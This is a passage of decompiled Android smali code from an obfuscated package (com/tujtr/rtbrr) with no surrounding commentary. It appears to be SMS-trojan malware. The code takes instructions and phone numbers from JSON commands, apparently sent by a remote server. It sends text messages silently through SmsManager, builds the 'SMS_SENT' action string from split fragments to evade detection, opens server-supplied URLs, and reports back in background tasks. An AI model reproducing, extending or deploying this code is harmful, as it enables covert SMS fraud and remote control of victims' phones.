    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    sput-boolean v8, Lcom/tujtr/rtbrr/TheSure;->d:Z

    const-string v0, "number_1"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, p1}, Lcom/tujtr/rtbrr/b;->c(Lorg/json/JSONObject;)Ljava/lang/String;

    move-result-object v3

    const-string v0, "SMS_DELIVERED"

    const-string v2, "SM"

    const-string v4, "S_S"

    const-string v5, "ENT"

    const-string v6, ""

    invoke-virtual {p0, v2, v4, v5, v6}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v4, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v4, v4, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    new-instance v5, Landroid/content/Intent;

    invoke-direct {v5, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {v4, v7, v5, v7}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    iget-object v0, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v0, v0, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    new-instance v4, Landroid/content/Intent;

    invoke-direct {v4, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {v0, v7, v4, v7}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    invoke-static {}, Landroid/telephony/gsm/SmsManager;->getDefault()Landroid/telephony/gsm/SmsManager;

    move-result-object v0

    const/4 v2, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/gsm/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    new-instance v0, Lcom/tujtr/rtbrr/c;

    iget-object v1, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v2, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    invoke-direct {v0, v1, v2}, Lcom/tujtr/rtbrr/c;-><init>(Lcom/tujtr/rtbrr/TheBack;Lcom/tujtr/rtbrr/TheBack;)V

    new-array v1, v8, [Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v1, v7

    invoke-virtual {v0, v1}, Lcom/tujtr/rtbrr/c;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    :cond_0
    return-void
.end method

.method protected varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/tujtr/rtbrr/b;->a([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public e(Ljava/lang/String;)Lorg/apache/http/client/methods/HttpGet;
    .locals 1

    new-instance v0, Lorg/apache/http/client/methods/HttpGet;

    invoke-direct {v0, p1}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    return-object v0
.end method

.method public e(Lorg/json/JSONObject;)V
    .locals 4

    const-string v0, "active_3"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->b(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "url"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->c(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v1, v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v0, 0x10000000

    invoke-virtual {v1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v1}, Lcom/tujtr/rtbrr/b;->a(Landroid/content/Intent;)V

    const/4 v0, 0x3

    new-instance v1, Lcom/tujtr/rtbrr/c;

    iget-object v2, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v3, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    invoke-direct {v1, v2, v3}, Lcom/tujtr/rtbrr/c;-><init>(Lcom/tujtr/rtbrr/TheBack;Lcom/tujtr/rtbrr/TheBack;)V

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v2, v3

    invoke-virtual {v1, v2}, Lcom/tujtr/rtbrr/c;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    :cond_0
    return-void
.end method

.method public f(Ljava/lang/String;)I
    .locals 1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x1

    goto :goto_0
.end method
